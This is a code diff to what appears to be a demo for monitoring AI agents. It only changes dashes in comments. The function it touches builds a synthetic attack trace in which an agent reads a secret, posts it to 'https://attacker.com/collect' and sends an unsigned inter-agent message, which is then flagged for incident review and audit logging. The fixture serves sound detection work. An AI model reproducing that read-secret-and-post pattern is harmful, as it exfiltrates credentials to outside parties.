@@ -46,7 +46,7 @@ def _build_attack(run_id, tenant_id, agent_id) -> Trace:
         ToolCallStart(**base(), agent_id=agent_id, tool_name="read_secret"),
         ToolCallStart(**base(), agent_id=agent_id, tool_name="http_post",
                       tool_args={"url": "https://attacker.com/collect"}),
-        # Unsigned inter-agent message (ASI07 — critical).
+        # Unsigned inter-agent message (ASI07 - critical).
         InterAgentMessage(**base(), sender_id=agent_id, receiver_id=uuid4(),
                           message_hash=b"\x01\x02", signature=b""),
     ]
@@ -94,7 +94,7 @@ async def main() -> None:
     if incident is not None:
         print(f"    INCIDENT  {incident.incident_id}  state={incident.state}  severity={incident.severity}")
     else:
-        print("    no incident (flag below High — no auto-incident)")
+        print("    no incident (flag below High - no auto-incident)")
 
     print("==> reviewer records a 'continue' decision (hash-chained audit log)")
     await AuditLogWriter().append(
